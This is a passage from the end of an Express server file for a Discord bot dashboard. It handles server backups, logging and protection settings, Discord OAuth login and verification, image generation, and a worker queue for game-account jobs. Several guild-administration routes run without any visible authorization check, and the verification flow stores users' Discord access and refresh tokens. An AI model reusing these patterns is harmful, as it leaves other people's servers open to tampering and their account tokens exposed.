        permissionOverwrites: c.permissionOverwrites?.cache.map((o) => ({
          id: o.id,
          type: o.type,
          allow: o.allow.bitfield.toString(),
          deny: o.deny.bitfield.toString()
        })) || []
      }));
      const backupData = JSON.stringify({ roles, channels });
      const name = `Backup ${(/* @__PURE__ */ new Date()).toLocaleString("ar-EG")}`;
      db.prepare("INSERT INTO backups (guildId, name, data) VALUES (?, ?, ?)").run(guildId, name, backupData);
      res.json({ success: true });
    } catch (err) {
      console.error("Backup failed:", err);
      res.status(500).json({ error: "Failed to create backup" });
    }
  });
  app.post("/api/guilds/:guildId/backups/:id/restore", async (req, res) => {
    const { guildId, id } = req.params;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).json({ error: "Guild not found" });
    const backup = db.prepare("SELECT * FROM backups WHERE guildId = ? AND id = ?").get(guildId, id);
    if (!backup) return res.status(404).json({ error: "Backup not found" });
    try {
      const data = JSON.parse(backup.data);
      for (const r of data.roles) {
        await guild.roles.create({
          name: r.name,
          color: r.color,
          hoist: r.hoist,
          permissions: BigInt(r.permissions),
          mentionable: r.mentionable,
          reason: "Backup Restore"
        }).catch(console.error);
      }
      for (const c of data.channels) {
        await guild.channels.create({
          name: c.name,
          type: c.type,
          topic: c.topic,
          nsfw: c.nsfw,
          rateLimitPerUser: c.rateLimitPerUser,
          reason: "Backup Restore"
        }).catch(console.error);
      }
      res.json({ success: true });
    } catch (err) {
      console.error("Restore failed:", err);
      res.status(500).json({ error: "Failed to restore backup" });
    }
  });
  app.delete("/api/guilds/:guildId/backups/:id", (req, res) => {
    const { guildId, id } = req.params;
    db.prepare("DELETE FROM backups WHERE guildId = ? AND id = ?").run(guildId, id);
    res.json({ success: true });
  });
  app.get("/api/guilds/:guildId/logging", (req, res) => {
    const { guildId } = req.params;
    const settings = db.prepare("SELECT * FROM logging_settings WHERE guildId = ?").get(guildId);
    res.json(settings || {
      channelId: null,
      logMessageDelete: 0,
      logMessageEdit: 0,
      logMemberJoin: 0,
      logMemberLeave: 0,
      logRoleUpdate: 0,
      logChannelUpdate: 0,
      logVoiceState: 0,
      logCommandUsage: 0,
      logLevelUp: 0,
      logTicketEvents: 0,
      logProtectionEvents: 0
    });
  });
  app.post("/api/guilds/:guildId/logging", (req, res) => {
    const { guildId } = req.params;
    const {
      channelId,
      logMessageDelete,
      logMessageEdit,
      logMemberJoin,
      logMemberLeave,
      logRoleUpdate,
      logChannelUpdate,
      logVoiceState,
      logCommandUsage,
      logLevelUp,
      logTicketEvents,
      logProtectionEvents
    } = req.body;
    db.prepare(`
      INSERT INTO logging_settings (
        guildId, channelId, logMessageDelete, logMessageEdit, logMemberJoin, 
        logMemberLeave, logRoleUpdate, logChannelUpdate, logVoiceState, 
        logCommandUsage, logLevelUp, logTicketEvents, logProtectionEvents
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(guildId) DO UPDATE SET 
        channelId = excluded.channelId,
        logMessageDelete = excluded.logMessageDelete,
        logMessageEdit = excluded.logMessageEdit,
        logMemberJoin = excluded.logMemberJoin,
        logMemberLeave = excluded.logMemberLeave,
        logRoleUpdate = excluded.logRoleUpdate,
        logChannelUpdate = excluded.logChannelUpdate,
        logVoiceState = excluded.logVoiceState,
        logCommandUsage = excluded.logCommandUsage,
        logLevelUp = excluded.logLevelUp,
        logTicketEvents = excluded.logTicketEvents,
        logProtectionEvents = excluded.logProtectionEvents
    `).run(
      guildId,
      channelId,
      logMessageDelete,
      logMessageEdit,
      logMemberJoin,
      logMemberLeave,
      logRoleUpdate,
      logChannelUpdate,
      logVoiceState,
      logCommandUsage,
      logLevelUp,
      logTicketEvents,
      logProtectionEvents
    );
    res.json({ status: "ok" });
  });
  app.get("/api/guilds/:guildId/custom-lists", (req, res) => {
    try {
      const { guildId } = req.params;
      const lists = db.prepare("SELECT * FROM custom_lists WHERE guildId = ?").all(guildId);
      res.json(lists.map((l) => ({ ...l, content: JSON.parse(l.content) })));
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch custom lists" });
    }
  });
  app.get("/api/blox/next-account", (req, res) => {
    const token = req.headers["x-worker-token"];
    if (token !== process.env.BLOX_WORKER_TOKEN) return res.status(403).json({ error: "Unauthorized" });
    const account = db.prepare("SELECT * FROM blox_fruits_requests WHERE status = 'pending' ORDER BY id ASC LIMIT 1").get();
    if (!account) return res.json({ status: "no_accounts" });
    db.prepare("UPDATE blox_fruits_requests SET status = 'processing' WHERE id = ?").run(account.id);
    res.json(account);
  });
  app.post("/api/blox/update-status", express.json(), (req, res) => {
    const token = req.headers["x-worker-token"];
    if (token !== process.env.BLOX_WORKER_TOKEN) return res.status(403).json({ error: "Unauthorized" });
    const { id, currentLevel, money, items, status } = req.body;
    db.prepare("UPDATE blox_fruits_requests SET currentLevel = ?, money = ?, items = ?, status = ?, lastUpdate = CURRENT_TIMESTAMP WHERE id = ?").run(currentLevel, money, JSON.stringify(items), status, id);
    res.json({ success: true });
  });
  app.post("/api/blox/log", express.json(), (req, res) => {
    const token = req.headers["x-worker-token"];
    if (token !== process.env.BLOX_WORKER_TOKEN) return res.status(403).json({ error: "Unauthorized" });
    const { requestId, message } = req.body;
    db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(requestId, message);
    res.json({ success: true });
  });
  app.post("/api/guilds/:guildId/custom-lists", express.json(), (req, res) => {
    try {
      const { guildId } = req.params;
      const { title, content } = req.body;
      db.prepare("INSERT INTO custom_lists (guildId, title, content) VALUES (?, ?, ?)").run(guildId, title, JSON.stringify(content));
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to create custom list" });
    }
  });
  app.delete("/api/guilds/:guildId/custom-lists/:id", (req, res) => {
    try {
      const { guildId, id } = req.params;
      db.prepare("DELETE FROM custom_lists WHERE guildId = ? AND id = ?").run(guildId, id);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to delete custom list" });
    }
  });
  app.post("/api/guilds/:guildId/protection", (req, res) => {
    const { guildId } = req.params;
    const { antiLink, antiSpam, antiRaid, antiBot, antiChannelControl, antiNuke, nukeLimit, logChannel, counterNuke } = req.body;
    db.prepare(`
      INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid, antiBot, antiChannelControl, antiNuke, nukeLimit, logChannel, counterNuke)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(guildId) DO UPDATE SET
        antiLink = excluded.antiLink,
        antiSpam = excluded.antiSpam,
        antiRaid = excluded.antiRaid,
        antiBot = excluded.antiBot,
        antiChannelControl = excluded.antiChannelControl,
        antiNuke = excluded.antiNuke,
        nukeLimit = excluded.nukeLimit,
        logChannel = excluded.logChannel,
        counterNuke = excluded.counterNuke
    `).run(
      guildId,
      antiLink ? 1 : 0,
      antiSpam ? 1 : 0,
      antiRaid ? 1 : 0,
      antiBot ? 1 : 0,
      antiChannelControl ? 1 : 0,
      antiNuke ? 1 : 0,
      nukeLimit || 3,
      logChannel,
      counterNuke ? 1 : 0
    );
    res.json({ success: true });
  });
  app.get("/api/auth/login", (req, res) => {
    let appUrl = APP_URL;
    const clientId = DISCORD_CLIENT_ID;
    if (!appUrl || !clientId) {
      console.error("Missing APP_URL or DISCORD_CLIENT_ID for auth login.");
      return res.status(500).send("Server configuration error: Missing APP_URL or DISCORD_CLIENT_ID. Please set these in config.ts or environment variables.");
    }
    appUrl = appUrl.replace(/\/$/, "");
    const REDIRECT_URI = `${appUrl}/api/auth/callback/dashboard`;
    const url = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
    console.log(`Redirecting to Discord login: ${url}`);
    res.redirect(url);
  });
  app.get("/api/auth/callback/dashboard", async (req, res) => {
    const { code, error, error_description } = req.query;
    if (error) {
      console.error(`Discord OAuth Error: ${error} - ${error_description}`);
      return res.status(400).send(`Discord Error: ${error_description || error}`);
    }
    if (!code) {
      console.error("Missing code in OAuth callback. Query params:", req.query);
      return res.status(400).send("Missing code from Discord. Did you cancel the login?");
    }
    let appUrl = APP_URL;
    const clientId = DISCORD_CLIENT_ID;
    const clientSecret = DISCORD_CLIENT_SECRET;
    if (!appUrl || !clientId || !clientSecret) {
      console.error("Missing APP_URL, DISCORD_CLIENT_ID, or DISCORD_CLIENT_SECRET for auth callback.");
      return res.status(500).send("Server configuration error: Missing environment variables or config.ts settings.");
    }
    appUrl = appUrl.replace(/\/$/, "");
    try {
      const REDIRECT_URI = `${appUrl}/api/auth/callback/dashboard`;
      console.log(`Exchanging code for token with redirect_uri: ${REDIRECT_URI}`);
      const response = await axios.post("https://discord.com/api/oauth2/token", new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: "authorization_code",
        code,
        redirect_uri: REDIRECT_URI
      }), {
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
      }).catch((err) => {
        console.error("Discord Token Exchange Error:", err.response?.data || err.message);
        throw err;
      });
      const { access_token } = response.data;
      const userResponse = await axios.get("https://discord.com/api/users/@me", {
        headers: { Authorization: `Bearer ${access_token}` }
      });
      const userGuildsResponse = await axios.get("https://discord.com/api/users/@me/guilds", {
        headers: { Authorization: `Bearer ${access_token}` }
      });
      const userData = userResponse.data;
      const userGuilds = userGuildsResponse.data;
      const adminGuilds = userGuilds.filter((g) => (BigInt(g.permissions) & BigInt(32)) === BigInt(32) || g.owner);
      const userPayload = {
        id: userData.id,
        username: userData.username,
        discriminator: userData.discriminator,
        avatar: userData.avatar,
        guilds: adminGuilds.map((g) => g.id)
      };
      const token = jwt.sign(userPayload, JWT_SECRET, { expiresIn: "30d" });
      console.log(`User ${userData.username} logged in. Token generated.`);
      res.send(`
        <html>
          <body>
            <script>
              localStorage.setItem('requiem_token', '${token}');
              window.location.href = '/';
            </script>
            <p>Logging you in... If you are not redirected, <a href="/">click here</a>.</p>
          </body>
        </html>
      `);
    } catch (err) {
      console.error("Dashboard OAuth error:", err);
      res.status(500).send("Authentication failed.");
    }
  });
  app.get("/api/auth/me", (req, res) => {
    const user = req.user || req.session.user || null;
    res.json(user);
  });
  app.get("/api/auth/logout", (req, res) => {
    req.session.destroy(() => {
      res.json({ success: true });
    });
  });
  app.get("/api/auth/callback", async (req, res) => {
    const { code, state: guildId } = req.query;
    if (!code) return res.status(400).send("Missing code");
    let appUrl = APP_URL || "";
    appUrl = appUrl.replace(/\/$/, "");
    try {
      const REDIRECT_URI = `${appUrl}/api/auth/callback`;
      const response = await axios.post("https://discord.com/api/oauth2/token", new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: "authorization_code",
        code,
        redirect_uri: REDIRECT_URI
      }), {
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
      });
      const { access_token, refresh_token, expires_in } = response.data;
      const userResponse = await axios.get("https://discord.com/api/users/@me", {
        headers: { Authorization: `Bearer ${access_token}` }
      });
      const userId = userResponse.data.id;
      db.prepare("INSERT OR REPLACE INTO tokens (userId, guildId, accessToken, refreshToken, expiresAt) VALUES (?, ?, ?, ?, ?)").run(userId, guildId || "unknown", access_token, refresh_token, Date.now() + expires_in * 1e3);
      if (guildId) {
        const protection = db.prepare("SELECT verifiedRoleId FROM protection_settings WHERE guildId = ?").get(guildId);
        if (protection?.verifiedRoleId) {
          const guild = client.guilds.cache.get(guildId);
          if (guild) {
            const member = await guild.members.fetch(userId).catch(() => null);
            if (member) {
              const role = guild.roles.cache.get(protection.verifiedRoleId);
              if (role) {
                await member.roles.add(role).catch(console.error);
              }
            }
          }
        }
      }
      res.send(`
        <html>
          <body style="background: #1a1a2e; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
            <div style="text-align: center; background: #16213e; padding: 2rem; border-radius: 1rem; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
              <h1 style="color: #5865f2;">\u2705 \u062A\u0645 \u0627\u0644\u062A\u062D\u0642\u0642 \u0628\u0646\u062C\u0627\u062D!</h1>
              <p>\u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u0622\u0646 \u0627\u0644\u0639\u0648\u062F\u0629 \u0625\u0644\u0649 \u062F\u064A\u0633\u0643\u0648\u0631\u062F \u0648\u0625\u063A\u0644\u0627\u0642 \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062D\u0629.</p>
            </div>
          </body>
        </html>
      `);
    } catch (err) {
      console.error("OAuth callback error:", err);
      res.status(500).send("\u0641\u0634\u0644 \u0627\u0644\u062A\u062D\u0642\u0642. \u064A\u0631\u062C\u0649 \u0627\u0644\u0645\u062D\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0623\u062E\u0631\u0649.");
    }
  });
  app.post("/api/generate-image", async (req, res) => {
    const user = req.user || req.session.user;
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    const { prompt } = req.body;
    if (!prompt) return res.status(400).json({ error: "Prompt is required" });
    try {
      const response = await ai.models.generateContent({
        model: "gemini-3.1-flash-image-preview",
        contents: { parts: [{ text: prompt }] },
        config: { imageConfig: { aspectRatio: "1:1", imageSize: "1K" } }
      });
      for (const part of response.candidates[0].content.parts) {
        if (part.inlineData) {
          return res.json({ imageUrl: `data:image/png;base64,${part.inlineData.data}` });
        }
      }
      res.status(500).json({ error: "No image generated" });
    } catch (error) {
      console.error("Image generation error:", error);
      res.status(500).json({ error: "Failed to generate image" });
    }
  });
  app.use("/api/*", (req, res) => {
    res.status(404).json({ error: "API route not found" });
  });
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa"
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.resolve(distPath, "index.html"));
    });
  }
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
  if (DISCORD_TOKEN) {
    client.login(DISCORD_TOKEN).catch((err) => {
      console.error("Failed to login to Discord:", err);
    });
  } else {
    console.warn("DISCORD_TOKEN not found in environment variables or config.ts.");
  }
}
startServer();
